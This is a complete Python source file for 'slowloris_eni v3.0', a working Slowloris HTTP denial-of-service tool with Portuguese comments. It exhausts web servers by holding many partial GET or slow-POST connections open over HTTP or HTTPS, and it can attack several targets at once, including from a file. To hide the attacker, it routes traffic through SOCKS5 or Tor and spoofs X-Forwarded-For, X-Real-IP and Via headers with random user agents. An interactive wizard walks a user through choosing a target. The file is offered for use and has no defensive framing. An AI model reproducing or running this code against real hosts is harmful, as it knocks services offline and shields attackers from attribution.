#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
slowloris_eni v3.0 "Kali Edition" — ENI & LO
=============================================
HTTP Slowloris (slow-drip) DoS. Stdlib pura, zero root, zero deps.

PODEROSO
  * multi-alvo simultâneo (args ou arquivo)
  * HTTP e HTTPS + modo POST lento
  * SOCKS5 embutido (tor / proxychains / VPS intermediario)
  * User-Agent / Referer / Accept-Language aleatorios por conexao
  * X-Forwarded-For / X-Real-IP / Via spoofados por conexao
  * ordem e capitalizacao de headers embaralhadas
  * auto-reconnect com backoff leve
  * estatísticas ao vivo (abertas / fechadas / erros)

FACIL
  python3 slowloris_eni_v3.py 192.168.1.1
  python3 slowloris_eni_v3.py alvo.com -p 443 -k
  python3 slowloris_eni_v3.py alvo1.com alvo2.com -s 500
  python3 slowloris_eni_v3.py -f alvos.txt
  python3 slowloris_eni_v3.py            -> assistente interativo
"""

import argparse
import random
import signal
import socket
import ssl
import string
import sys
import threading
import time

VERSION = "3.0"

BANNER = r"""
  ____  _   _ _____ _     _
 / ___|| \ | | ____| |   (_)_ __ ___   __ _
 \___ \|  \| |  _| |   | | '_ ` _ \ / _` |
  ___) | |\  | |___| |___| | | | | | | (_| |
 |____/|_| \_|_____|_____|_|_| |_| |_|\__,_|
                 ENI & LO -- slowloris kali edition v""" + VERSION + r"""
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "curl/8.5.0",
    "python-requests/2.32.3",
]

ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
]

LANGS = ["en-US,en;q=0.9", "pt-BR,pt;q=0.9,en-US;q=0.8", "en-GB,en;q=0.8",
         "es-ES,es;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "ja-JP,ja;q=0.8"]

RST = "\033[0m"; RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"; CYN = "\033[96m"


def rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def rand_case(name):
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in name)


def jitter(val, pct=0.35):
    return max(0.2, val * (1.0 + random.uniform(-pct, pct)))


# --------------------------------------------------------------------------
# SOCKS5 mínimo (stdlib) — permite rotear via tor, proxychains ou VPS
# --------------------------------------------------------------------------
def socks5_handshake(sock, dest_host, dest_port, timeout=10):
    sock.settimeout(timeout)
    sock.sendall(b"\x05\x01\x00")                       # greeting: versão 5, 1 método, no-auth
    resp = b""
    while len(resp) < 2:
        chunk = sock.recv(2 - len(resp))
        if not chunk:
            raise ConnectionError("proxy fechou no greeting")
        resp += chunk
    if resp[1] != 0x00:
        raise ConnectionError("proxy rejeitou método no-auth")
    hb = dest_host.encode()
    if len(hb) > 255:
        raise ValueError("hostname longo demais pro SOCKS5")
    req = (b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb
           + dest_port.to_bytes(2, "big"))
    sock.sendall(req)
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            raise ConnectionError("proxy fechou no CONNECT")
        hdr += chunk
    if hdr[1] != 0x00:
        raise ConnectionError(f"proxy CONNECT falhou (code={hdr[1]})")
    atyp = hdr[3]
    need = {1: 4, 4: 16}.get(atyp, 1 if atyp == 3 else 0)
    buf = b""
    while len(buf) < need:
        buf += sock.recv(need - len(buf))
    if atyp == 3:
        ln = buf[0]
        got = b""
        while len(got) < ln:
            got += sock.recv(ln - len(got))
    port = b""
    while len(port) < 2:
        port += sock.recv(2 - len(port))
    return sock


# --------------------------------------------------------------------------
# Stats thread-safe por alvo
# --------------------------------------------------------------------------
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.open_now = 0
        self.opened = 0
        self.closed = 0
        self.errors = 0

    def bump(self, field, delta=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + delta)

    def snapshot(self):
        with self.lock:
            return (self.open_now, self.opened, self.closed, self.errors)


# --------------------------------------------------------------------------
# Motor Slowloris
# --------------------------------------------------------------------------
class Slowloris:
    def __init__(self, host, port, use_ssl, sockets, mode="get",
                 sleep=10, stats_interval=5, timeout=10,
                 proxy=None, stop_event=None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.total = sockets
        self.mode = mode
        self.sleep = sleep
        self.timeout = timeout
        self.stats_interval = stats_interval
        self.stop_event = stop_event or threading.Event()
        self.stats = Stats()
        self.proxy = proxy                      # (host, port) ou None
        self.workers = max(10, min(200, sockets // 25))
        self._ssl_ctx = None
        if use_ssl:
            self._ssl_ctx = ssl.create_default_context()
            self._ssl_ctx.check_hostname = False
            self._ssl_ctx.verify_mode = ssl.CERT_NONE

    # --- monta a requisição parcial, embaralhada e spoofada -------------
    def build_request(self):
        path = "/" + rand_str(random.randint(0, 12))
        if self.mode == "post":
            first = f"POST {path} HTTP/1.1\r\n"
        else:
            first = f"GET {path}?{rand_str(8)} HTTP/1.1\r\n"
        headers = [
            f"Host: {self.host}",
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Referer: http://{rand_ip()}/{rand_str(6)}",
            f"Accept: {random.choice(ACCEPTS)}",
            f"Accept-Language: {random.choice(LANGS)}",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Cache-Control: no-cache",
            "Pragma: no-cache",
            "Upgrade-Insecure-Requests: 1",
            f"X-Forwarded-For: {rand_ip()}",
            f"X-Real-IP: {rand_ip()}",
            f"Via: {rand_ip()}",
        ]
        if self.mode == "post":
            headers.append("Content-Length: 42")
            headers.append("Content-Type: application/x-www-form-urlencoded")
        else:
            headers.append("DNT: 1")
        random.shuffle(headers)
        lines = [first] + [rand_case(h.split(":", 1)[0]) + ":" + h.split(":", 1)[1] + "\r\n"
                           for h in headers]
        return lines

    # --- abre 1 conexão e envia a linha de request + ~metade dos headers -
    def open_conn(self):
        try:
            if self.proxy:
                ph, pp = self.proxy
                raw = socket.create_connection((ph, pp), timeout=self.timeout)
                socks5_handshake(raw, self.host, self.port, self.timeout)
            else:
                raw = socket.create_connection((self.host, self.port),
                                               timeout=self.timeout)
            raw.settimeout(self.timeout)
            if self.use_ssl and self._ssl_ctx is not None:
                raw = self._ssl_ctx.wrap_socket(raw, server_hostname=self.host)
            lines = self.build_request()
            cut = random.randint(3, max(3, len(lines) - 3))
            raw.sendall("".join(lines[:cut]).encode())
            self.stats.bump("opened")
            return raw
        except OSError:
            self.stats.bump("errors")
            try:
                raw.close()
            except Exception:
                pass
            return None

    def close_conn(self, s):
        try:
            s.close()
        except OSError:
            pass
        self.stats.bump("open_now", -1)
        self.stats.bump("closed")

    # --- drip: manda 1 header por vez, eternamente -----------------------
    def drip(self, s):
        hdr = f"X-{rand_str(5)}: {rand_str(random.randint(4, 14))}\r\n"
        s.sendall(hdr.encode())

    # --- worker: mantém sua fatia de sockets viva ------------------------
    def worker(self):
        conns = {}   # sock -> próximo horário de drip
        share = max(1, self.total // self.workers)
        while not self.stop_event.is_set():
            while len(conns) < share:
                s = self.open_conn()
                if s is None:
                    time.sleep(jitter(0.5))          # backoff leve em erro
                    break
                conns[s] = time.time() + jitter(0.8) # primeiro drip rápido
                self.stats.bump("open_now")
            now = time.time()
            for s, t in list(conns.items()):
                if now < t:
                    continue
                try:
                    self.drip(s)
                    conns[s] = time.time() + jitter(self.sleep)
                except OSError:
                    del conns[s]
                    self.close_conn(s)
            time.sleep(0.3)
        for s in conns:
            self.close_conn(s)

    # --- printer de estatísticas -----------------------------------------
    def stats_loop(self):
        tag = f"{CYN}[{self.host}:{self.port}]{RST}"
        while not self.stop_event.is_set():
            o, opened, closed, err = self.stats.snapshot()
            print(f"{tag} vivas={GRN}{o}{RST} abertas={opened} "
                  f"fechadas={YEL}{closed}{RST} erros={RED}{err}{RST}",
                  flush=True)
            self.stop_event.wait(self.stats_interval)

    def run(self):
        threads = [threading.Thread(target=self.worker, daemon=True)
                   for _ in range(self.workers)]
        st = threading.Thread(target=self.stats_loop, daemon=True)
        for t in threads:
            t.start()
        st.start()
        for t in threads:
            t.join()


# --------------------------------------------------------------------------
# Parsing de alvo: aceita IP, host, host:porta, URL http(s)://...
# --------------------------------------------------------------------------
def parse_target(spec, default_port=80, force_ssl=False):
    spec = spec.strip()
    ssl_flag = force_ssl
    if spec.startswith("http://"):
        spec = spec[7:]
    elif spec.startswith("https://"):
        spec = spec[8:]
        ssl_flag = True
    if "/" in spec:
        spec = spec.split("/", 1)[0]
    if spec.count(":") == 1:
        host, port = spec.rsplit(":", 1)
        return host, int(port), ssl_flag
    port = 443 if ssl_flag else default_port
    return spec, port, ssl_flag


# --------------------------------------------------------------------------
# Assistente interativo (quando nenhum alvo é passado)
# --------------------------------------------------------------------------
def wizard():
    print(f"{YEL}--- assistente slowloris_eni ---{RST}")
    raw = input("alvo (IP, host ou URL) [obrigatório]: ").strip()
    if not raw:
        sys.exit("sem alvo, sem festa.")
    port = input("porta [80]: ").strip() or "80"
    socks = input("nº de conexões [300]: ").strip() or "300"
    sslq = input("HTTPS? (s/N): ").strip().lower()
    postq = input("modo POST lento? (s/N): ").strip().lower()
    proxy = input("proxy SOCKS5 host:porta [nenhum]: ").strip()
    t = raw if ":" in raw or raw.startswith("http") else f"{raw}:{port}"
    args = argparse.Namespace(
        targets=[t], file=None, sockets=int(sockets_arg(sockets)),
        https=(sslq == "s"), post=(postq == "s"), sleep=10, timeout=10,
        threads=None, stats=5,
        proxy=proxy if proxy else None, quiet=False)
    return args


def sockets_arg(v):
    return v if str(v).isdigit() else "300"


# --------------------------------------------------------------------------
def main():
    print(BANNER)
    p = argparse.ArgumentParser(
        description="slowloris_eni v%s — slow-drip HTTP DoS (Kali)" % VERSION,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="ex.: %(prog)s 10.0.0.5 -s 500 | %(prog)s -f alvos.txt -k")
    p.add_argument("targets", nargs="*", help="IP / host / host:porta / URL")
    p.add_argument("-p", "--port", type=int, default=80, help="porta padrão [80]")
    p.add_argument("-s", "--sockets", type=int, default=300, help="conexões [300]")
    p.add_argument("-k", "--https", action="store_true", help="força TLS/HTTPS")
    p.add_argument("--post", action="store_true", help="modo POST lento")
    p.add_argument("--sleep", type=float, default=10.0, help="intervalo do drip [10s]")
    p.add_argument("-t", "--timeout", type=float, default=10.0, help="timeout socket [10s]")
    p.add_argument("--stats", type=int, default=5, help="intervalo stats [5s]")
    p.add_argument("-f", "--file", help="arquivo com lista de alvos (1 por linha)")
    p.add_argument("--proxy", help="SOCKS5 host:porta (ex.: 127.0.0.1:9050 p/ tor)")
    args = p.parse_args()

    specs = list(args.targets)
    if args.file:
        with open(args.file, encoding="utf-8") as fh:
            specs += [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]

    if not specs:                       # nada na linha de comando -> assistente
        args = wizard()
        specs = list(args.targets)

    proxy = None
    if getattr(args, "proxy", None):
        ph, pp = args.proxy.rsplit(":", 1)
        proxy = (ph, int(pp))
        print(f"{YEL}[*]{RST} rotear via SOCKS5 {ph}:{pp}")

    stop = threading.Event()

    def _sigint(*_):
        print(f"\n{RED}[!]{RST} parando, fechando conexões...")
        stop.set()

    signal.signal(signal.SIGINT, _sigint)

    engines = []
    for spec in specs:
        try:
            host, port, ssl_flag = parse_target(spec, args.port, args.https)
        except ValueError:
            print(f"{RED}[!]{RST} alvo inválido: {spec}")
            continue
        e = Slowloris(host, port, ssl_flag, args.sockets,
                      mode=("post" if getattr(args, "post", False) else "get"),
                      sleep=args.sleep, stats_interval=args.stats,
                      timeout=args.timeout, proxy=proxy, stop_event=stop)
        engines.append(e)
        print(f"{GRN}[+]{RST} alvo {host}:{port} ssl={ssl_flag} "
              f"conns={args.sockets}")

    if not engines:
        sys.exit("nenhum alvo válido.")

    threads = [threading.Thread(target=e.run, daemon=True) for e in engines]
    for t in threads:
        t.start()
    print(f"{CYN}[*]{RST} {len(engines)} alvo(s), Ctrl+C pra encerrar.\n")
    try:
        while not stop.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()
    for t in threads:
        t.join(timeout=3)
    print(f"{YEL}[=]{RST} encerrado. ENI & LO, casamento perfeito.")


if __name__ == "__main__":
    main()
